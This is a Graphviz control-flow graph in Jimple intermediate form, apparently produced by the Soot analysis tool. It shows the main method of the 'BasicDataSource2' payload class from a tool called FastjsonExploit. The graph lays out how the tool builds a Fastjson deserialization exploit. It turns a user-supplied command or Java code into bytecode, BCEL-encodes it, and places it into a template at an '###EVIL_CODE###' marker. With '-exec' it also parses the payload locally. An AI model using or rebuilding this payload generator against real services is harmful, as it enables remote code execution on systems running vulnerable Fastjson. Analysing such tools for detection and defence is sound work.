digraph "unitGraph" {
    "r20 := @this: payloads.BasicDataSource2"
    "r0 := @parameter0: java.lang.String[]"
    "$i0 = lengthof r0"
    "if $i0 == 2 goto $r1 = r0[1]"
    "$i2 = lengthof r0"
    "if $i2 == 3 goto $r1 = r0[1]"
    "$r18 = <java.lang.System: java.io.PrintStream out>"
    "virtualinvoke $r18.<java.io.PrintStream: void println(java.lang.String)>(\"[*] Usage: java -jar FastjsonExploit-[version].jar BasicDataSource2 \\\"[cmd:xxx|code:xxx.java]\\\"\")"
    "return"
    "$r1 = r0[1]"
    "r21 = virtualinvoke $r1.<java.lang.String: java.lang.String trim()>()"
    "$r2 = new util.JarFileReader"
    "specialinvoke $r2.<util.JarFileReader: void <init>()>()"
    "r3 = $r2"
    "r22 = virtualinvoke r3.<util.JarFileReader: java.lang.String read(java.lang.String)>(\"BasicDataSource2.tpl\")"
    "r4 = staticinvoke <gadget.Gadget: byte[] getBasicDataSource1ExpCode(java.lang.String)>(r21)"
    "r23 = staticinvoke <com.sun.org.apache.bcel.internal.classfile.Utility: java.lang.String encode(byte[],boolean)>(r4, 1)"
    "$r5 = new java.lang.StringBuilder"
    "specialinvoke $r5.<java.lang.StringBuilder: void <init>()>()"
    "$r6 = virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(\"$$BCEL$$\")"
    "$r7 = virtualinvoke $r6.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r23)"
    "r24 = virtualinvoke $r7.<java.lang.StringBuilder: java.lang.String toString()>()"
    "r25 = virtualinvoke r22.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(\"###EVIL_CODE###\", r24)"
    "$r8 = <java.lang.System: java.io.PrintStream out>"
    "virtualinvoke $r8.<java.io.PrintStream: void println(java.lang.String)>(\"[*] payload build success!\")"
    "$r10 = <java.lang.System: java.io.PrintStream out>"
    "$r9 = new java.lang.StringBuilder"
    "specialinvoke $r9.<java.lang.StringBuilder: void <init>()>()"
    "$r11 = virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(\"\n\")"
    "$r12 = virtualinvoke $r11.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r25)"
    "$r13 = virtualinvoke $r12.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(\"\n\")"
    "$r14 = virtualinvoke $r13.<java.lang.StringBuilder: java.lang.String toString()>()"
    "virtualinvoke $r10.<java.io.PrintStream: void println(java.lang.String)>($r14)"
    "$i1 = lengthof r0"
    "if $i1 != 3 goto (branch)"
    "$r15 = r0[2]"
    "$z0 = virtualinvoke $r15.<java.lang.String: boolean equals(java.lang.Object)>(\"-exec\")"
    "if $z0 == 0 goto (branch)"
    "$r16 = <java.lang.System: java.io.PrintStream out>"
    "virtualinvoke $r16.<java.io.PrintStream: void println(java.lang.String)>(\"[*] Try local parsing\")"
    "staticinvoke <com.alibaba.fastjson.JSON: com.alibaba.fastjson.JSONObject parseObject(java.lang.String)>(r25)"
    "goto [?= return]"
    "$r19 := @caughtexception"
    "r26 = $r19"
    "virtualinvoke r26.<java.lang.Exception: void printStackTrace()>()"
    "r20 := @this: payloads.BasicDataSource2"->"r0 := @parameter0: java.lang.String[]";
    "r0 := @parameter0: java.lang.String[]"->"$i0 = lengthof r0";
    "$i0 = lengthof r0"->"if $i0 == 2 goto $r1 = r0[1]";
    "if $i0 == 2 goto $r1 = r0[1]"->"$i2 = lengthof r0";
    "if $i0 == 2 goto $r1 = r0[1]"->"$r1 = r0[1]";
    "if $i0 == 2 goto $r1 = r0[1]"->"$r19 := @caughtexception";
    "$i2 = lengthof r0"->"if $i2 == 3 goto $r1 = r0[1]";
    "if $i2 == 3 goto $r1 = r0[1]"->"$r18 = <java.lang.System: java.io.PrintStream out>";
    "if $i2 == 3 goto $r1 = r0[1]"->"$r1 = r0[1]";
    "if $i2 == 3 goto $r1 = r0[1]"->"$r19 := @caughtexception";
    "$r18 = <java.lang.System: java.io.PrintStream out>"->"virtualinvoke $r18.<java.io.PrintStream: void println(java.lang.String)>(\"[*] Usage: java -jar FastjsonExploit-[version].jar BasicDataSource2 \\\"[cmd:xxx|code:xxx.java]\\\"\")";
    "virtualinvoke $r18.<java.io.PrintStream: void println(java.lang.String)>(\"[*] Usage: java -jar FastjsonExploit-[version].jar BasicDataSource2 \\\"[cmd:xxx|code:xxx.java]\\\"\")"->"return";
    "$r1 = r0[1]"->"r21 = virtualinvoke $r1.<java.lang.String: java.lang.String trim()>()";
    "$r1 = r0[1]"->"$r19 := @caughtexception";
    "r21 = virtualinvoke $r1.<java.lang.String: java.lang.String trim()>()"->"$r2 = new util.JarFileReader";
    "r21 = virtualinvoke $r1.<java.lang.String: java.lang.String trim()>()"->"$r19 := @caughtexception";
    "$r2 = new util.JarFileReader"->"specialinvoke $r2.<util.JarFileReader: void <init>()>()";
    "$r2 = new util.JarFileReader"->"$r19 := @caughtexception";
    "specialinvoke $r2.<util.JarFileReader: void <init>()>()"->"r3 = $r2";
    "specialinvoke $r2.<util.JarFileReader: void <init>()>()"->"$r19 := @caughtexception";
    "r3 = $r2"->"r22 = virtualinvoke r3.<util.JarFileReader: java.lang.String read(java.lang.String)>(\"BasicDataSource2.tpl\")";
    "r3 = $r2"->"$r19 := @caughtexception";
    "r22 = virtualinvoke r3.<util.JarFileReader: java.lang.String read(java.lang.String)>(\"BasicDataSource2.tpl\")"->"r4 = staticinvoke <gadget.Gadget: byte[] getBasicDataSource1ExpCode(java.lang.String)>(r21)";
    "r22 = virtualinvoke r3.<util.JarFileReader: java.lang.String read(java.lang.String)>(\"BasicDataSource2.tpl\")"->"$r19 := @caughtexception";
    "r4 = staticinvoke <gadget.Gadget: byte[] getBasicDataSource1ExpCode(java.lang.String)>(r21)"->"r23 = staticinvoke <com.sun.org.apache.bcel.internal.classfile.Utility: java.lang.String encode(byte[],boolean)>(r4, 1)";
    "r4 = staticinvoke <gadget.Gadget: byte[] getBasicDataSource1ExpCode(java.lang.String)>(r21)"->"$r19 := @caughtexception";
    "r23 = staticinvoke <com.sun.org.apache.bcel.internal.classfile.Utility: java.lang.String encode(byte[],boolean)>(r4, 1)"->"$r5 = new java.lang.StringBuilder";
    "r23 = staticinvoke <com.sun.org.apache.bcel.internal.classfile.Utility: java.lang.String encode(byte[],boolean)>(r4, 1)"->"$r19 := @caughtexception";
    "$r5 = new java.lang.StringBuilder"->"specialinvoke $r5.<java.lang.StringBuilder: void <init>()>()";
    "$r5 = new java.lang.StringBuilder"->"$r19 := @caughtexception";
    "specialinvoke $r5.<java.lang.StringBuilder: void <init>()>()"->"$r6 = virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(\"$$BCEL$$\")";
    "specialinvoke $r5.<java.lang.StringBuilder: void <init>()>()"->"$r19 := @caughtexception";
    "$r6 = virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(\"$$BCEL$$\")"->"$r7 = virtualinvoke $r6.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r23)";
    "$r6 = virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(\"$$BCEL$$\")"->"$r19 := @caughtexception";
    "$r7 = virtualinvoke $r6.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r23)"->"r24 = virtualinvoke $r7.<java.lang.StringBuilder: java.lang.String toString()>()";
    "$r7 = virtualinvoke $r6.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r23)"->"$r19 := @caughtexception";
    "r24 = virtualinvoke $r7.<java.lang.StringBuilder: java.lang.String toString()>()"->"r25 = virtualinvoke r22.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(\"###EVIL_CODE###\", r24)";
    "r24 = virtualinvoke $r7.<java.lang.StringBuilder: java.lang.String toString()>()"->"$r19 := @caughtexception";
    "r25 = virtualinvoke r22.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(\"###EVIL_CODE###\", r24)"->"$r8 = <java.lang.System: java.io.PrintStream out>";
    "r25 = virtualinvoke r22.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(\"###EVIL_CODE###\", r24)"->"$r19 := @caughtexception";
    "$r8 = <java.lang.System: java.io.PrintStream out>"->"virtualinvoke $r8.<java.io.PrintStream: void println(java.lang.String)>(\"[*] payload build success!\")";
    "$r8 = <java.lang.System: java.io.PrintStream out>"->"$r19 := @caughtexception";
    "virtualinvoke $r8.<java.io.PrintStream: void println(java.lang.String)>(\"[*] payload build success!\")"->"$r10 = <java.lang.System: java.io.PrintStream out>";
    "virtualinvoke $r8.<java.io.PrintStream: void println(java.lang.String)>(\"[*] payload build success!\")"->"$r19 := @caughtexception";
    "$r10 = <java.lang.System: java.io.PrintStream out>"->"$r9 = new java.lang.StringBuilder";
    "$r10 = <java.lang.System: java.io.PrintStream out>"->"$r19 := @caughtexception";
    "$r9 = new java.lang.StringBuilder"->"specialinvoke $r9.<java.lang.StringBuilder: void <init>()>()";
    "$r9 = new java.lang.StringBuilder"->"$r19 := @caughtexception";
    "specialinvoke $r9.<java.lang.StringBuilder: void <init>()>()"->"$r11 = virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(\"\n\")";
    "specialinvoke $r9.<java.lang.StringBuilder: void <init>()>()"->"$r19 := @caughtexception";
    "$r11 = virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(\"\n\")"->"$r12 = virtualinvoke $r11.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r25)";
    "$r11 = virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(\"\n\")"->"$r19 := @caughtexception";
    "$r12 = virtualinvoke $r11.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r25)"->"$r13 = virtualinvoke $r12.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(\"\n\")";
    "$r12 = virtualinvoke $r11.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r25)"->"$r19 := @caughtexception";
    "$r13 = virtualinvoke $r12.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(\"\n\")"->"$r14 = virtualinvoke $r13.<java.lang.StringBuilder: java.lang.String toString()>()";
    "$r13 = virtualinvoke $r12.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(\"\n\")"->"$r19 := @caughtexception";
    "$r14 = virtualinvoke $r13.<java.lang.StringBuilder: java.lang.String toString()>()"->"virtualinvoke $r10.<java.io.PrintStream: void println(java.lang.String)>($r14)";
    "$r14 = virtualinvoke $r13.<java.lang.StringBuilder: java.lang.String toString()>()"->"$r19 := @caughtexception";
    "virtualinvoke $r10.<java.io.PrintStream: void println(java.lang.String)>($r14)"->"$i1 = lengthof r0";
    "virtualinvoke $r10.<java.io.PrintStream: void println(java.lang.String)>($r14)"->"$r19 := @caughtexception";
    "$i1 = lengthof r0"->"if $i1 != 3 goto (branch)";
    "$i1 = lengthof r0"->"$r19 := @caughtexception";
    "if $i1 != 3 goto (branch)"->"$r15 = r0[2]";
    "if $i1 != 3 goto (branch)"->"goto [?= return]";
    "if $i1 != 3 goto (branch)"->"$r19 := @caughtexception";
    "$r15 = r0[2]"->"$z0 = virtualinvoke $r15.<java.lang.String: boolean equals(java.lang.Object)>(\"-exec\")";
    "$r15 = r0[2]"->"$r19 := @caughtexception";
    "$z0 = virtualinvoke $r15.<java.lang.String: boolean equals(java.lang.Object)>(\"-exec\")"->"if $z0 == 0 goto (branch)";
    "$z0 = virtualinvoke $r15.<java.lang.String: boolean equals(java.lang.Object)>(\"-exec\")"->"$r19 := @caughtexception";
    "if $z0 == 0 goto (branch)"->"$r16 = <java.lang.System: java.io.PrintStream out>";
    "if $z0 == 0 goto (branch)"->"goto [?= return]";
    "if $z0 == 0 goto (branch)"->"$r19 := @caughtexception";
    "$r16 = <java.lang.System: java.io.PrintStream out>"->"virtualinvoke $r16.<java.io.PrintStream: void println(java.lang.String)>(\"[*] Try local parsing\")";
    "$r16 = <java.lang.System: java.io.PrintStream out>"->"$r19 := @caughtexception";
    "virtualinvoke $r16.<java.io.PrintStream: void println(java.lang.String)>(\"[*] Try local parsing\")"->"staticinvoke <com.alibaba.fastjson.JSON: com.alibaba.fastjson.JSONObject parseObject(java.lang.String)>(r25)";
    "virtualinvoke $r16.<java.io.PrintStream: void println(java.lang.String)>(\"[*] Try local parsing\")"->"$r19 := @caughtexception";
    "staticinvoke <com.alibaba.fastjson.JSON: com.alibaba.fastjson.JSONObject parseObject(java.lang.String)>(r25)"->"goto [?= return]";
    "staticinvoke <com.alibaba.fastjson.JSON: com.alibaba.fastjson.JSONObject parseObject(java.lang.String)>(r25)"->"$r19 := @caughtexception";
    "goto [?= return]"->"return";
    "$r19 := @caughtexception"->"r26 = $r19";
    "r26 = $r19"->"virtualinvoke r26.<java.lang.Exception: void printStackTrace()>()";
    "virtualinvoke r26.<java.lang.Exception: void printStackTrace()>()"->"return";
}
